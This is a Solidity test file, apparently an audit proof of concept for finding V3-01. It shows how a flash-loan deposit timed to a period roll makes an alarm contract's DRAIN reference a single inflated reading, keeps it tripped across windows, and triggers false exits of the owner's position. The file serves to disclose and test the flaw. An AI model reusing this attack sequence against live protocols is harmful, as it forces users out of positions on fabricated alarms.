// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Base} from "../Base.sol";
import {AlarmBook} from "../../src/AlarmBook.sol";
import {ExitRouter} from "../../src/ExitRouter.sol";
import {MockERC20} from "../Mocks.sol";
import {RealVault, FlashAttacker} from "../AlarmAttacks.t.sol";

/// @notice V3-01. A DRAIN reference can be one flash-inflated reading.
/// INVARIANTS.md A5 says a single high totalAssets reading "never becomes a reference: the lowest sample of a whole
/// period does". That holds only if some other CLEAR sample lands in the same period. The candidate set by a roll is
/// the only sample of its period unless someone else checkpoints before the next roll, and once the key reads tripped
/// `checkpoint` returns early, so honest samples can no longer lower the stuck candidate. An attacker with a flash loan
/// (no capital, no shares) then fires DRAIN on a vault that lost nothing, and a keeper exits every position armed on it.
contract V3DrainTest is Base {
    uint32 internal constant WINDOW = 3600; // the app's preset
    uint256 internal constant LOAN = 500e18;

    MockERC20 internal asset;
    RealVault internal rv;
    FlashAttacker internal fa;
    bytes32 internal key;
    bytes32 internal posId;

    function setUp() public override {
        super.setUp();
        asset = new MockERC20(18);
        rv = new RealVault(asset);
        fa = new FlashAttacker();
        asset.mint(OWNER, 1000e18);
        vm.prank(OWNER);
        asset.approve(address(rv), 1000e18);
        vm.prank(OWNER);
        rv.deposit(1000e18, OWNER);
        key = book.register(_detector(AlarmBook.Kind.DRAIN, address(rv), 2500, WINDOW, 0, 0));
        // An honest first period: the reference is the real 1000.
        vm.warp(block.timestamp + WINDOW / 2);
        book.checkpoint(key);
        (,,,, uint256 snap,,) = book.state(key);
        assertEq(snap, 1000e18, "honest reference");
        // The owner arms on DRAIN alone (the contract allows it; the app pairs it with a quorum).
        vm.prank(OWNER);
        rv.approve(address(router), type(uint256).max);
        vm.prank(OWNER);
        posId = router.arm(_params(address(rv), 0, 0, _keys(key)));
    }

    /// @dev The attacker lands a flash deposit on the roll, so the next reference candidate is 1500.
    function _flashRoll() internal {
        vm.warp(block.timestamp + WINDOW / 2);
        asset.mint(address(fa), LOAN);
        fa.flash(book, rv, key, LOAN);
        (,,, uint256 cand,,,) = book.state(key);
        assertEq(cand, 1500e18, "the flash reading is the candidate");
    }

    function test_V3_01_flashCandidateBecomesTheReference_andFiresWithNoLoss() public {
        _flashRoll();
        // Nobody samples during this period. At its end anyone rolls (plain checkpoint, no flash needed).
        vm.warp(block.timestamp + WINDOW / 2);
        book.checkpoint(key);
        (,,,, uint256 snap,,) = book.state(key);
        assertEq(snap, 1500e18, "the single flash reading became the reference");
        assertEq(rv.totalAssets(), 1000e18, "the vault lost nothing");

        // Honest samples now change nothing: the key reads tripped, so checkpoint returns early.
        uint256 candBefore;
        (,,, candBefore,,,) = book.state(key);
        book.checkpoint(key);
        (,,, uint256 candAfter,,,) = book.state(key);
        assertEq(candAfter, candBefore, "an honest sample can't repair it while tripped");

        // Two pokes a minute apart fire it, and any keeper exits the owner.
        assertTrue(!book.poke(key), "first sighting");
        vm.warp(block.timestamp + 60);
        assertTrue(book.poke(key), "second sighting fires a DRAIN that never happened");
        vm.prank(KEEPER);
        router.exit(posId, key, 0);
        assertEq(asset.balanceOf(OWNER), 1000e18, "the owner was exited on a false drain");
        assertEq(rv.balanceOf(OWNER), 0, "position closed");
    }

    /// Control: one honest sample in the period after the flash roll pulls the candidate back down, and nothing fires.
    function test_V3_01_control_oneHonestSamplePerPeriodPreventsIt() public {
        _flashRoll();
        vm.warp(block.timestamp + 600);
        book.checkpoint(key); // the keeper's sample
        vm.warp(block.timestamp + WINDOW / 2 - 600);
        book.checkpoint(key);
        (,,,, uint256 snap,,) = book.state(key);
        assertEq(snap, 1000e18, "reference stays honest");
        assertTrue(!book.check(key), "nothing to fire");
    }

    /// Persistence: once tripped, honest sampling never helps. Only winning the next roll does; an attacker who lands a
    /// flash deposit on each roll keeps the key tripped across windows, and it refires every day.
    function test_V3_01_attackerWhoWinsEachRollKeepsItTripped() public {
        _flashRoll();
        vm.warp(block.timestamp + WINDOW / 2);
        asset.mint(address(fa), LOAN);
        fa.flash(book, rv, key, LOAN); // roll: reference 1500, candidate 1500 again
        assertTrue(!book.poke(key), "sighting");
        vm.warp(block.timestamp + 60);
        assertTrue(book.poke(key), "fires");
        (, uint64 firedAt,,,,,) = book.state(key);
        uint256 rolls;
        // For the next day a keeper samples every 10 minutes (all ignored while tripped). Each time the reference
        // expires and the key reads clear, the attacker takes the roll with a flash deposit (it knows the exact second).
        while (block.timestamp < uint256(firedAt) + 1 days) {
            (,, uint64 snapAt,,,,) = book.state(key);
            if (block.timestamp > uint256(snapAt) + WINDOW) {
                vm.warp(uint256(snapAt) + WINDOW + 1);
                asset.mint(address(fa), LOAN);
                fa.flash(book, rv, key, LOAN);
                ++rolls;
                (,,,, uint256 snap,,) = book.state(key);
                assertEq(snap, 1500e18, "still the flash reading");
            } else {
                book.checkpoint(key);
            }
            vm.warp(block.timestamp + 600);
        }
        assertTrue(rolls >= 20, "the attacker took every roll of the day");
        (,, uint64 lastRoll,,,,) = book.state(key);
        // The attacker takes the next roll too, then sights the "drain" twice within the fresh reference's window.
        if (block.timestamp < uint256(lastRoll) + WINDOW + 1) vm.warp(uint256(lastRoll) + WINDOW + 1);
        asset.mint(address(fa), LOAN);
        fa.flash(book, rv, key, LOAN);
        assertTrue(!book.poke(key), "sighting");
        vm.warp(block.timestamp + 60);
        assertTrue(book.poke(key), "and it refires a day later, with the vault whole throughout");
        assertEq(rv.totalAssets(), 1000e18, "never drained");
    }
}
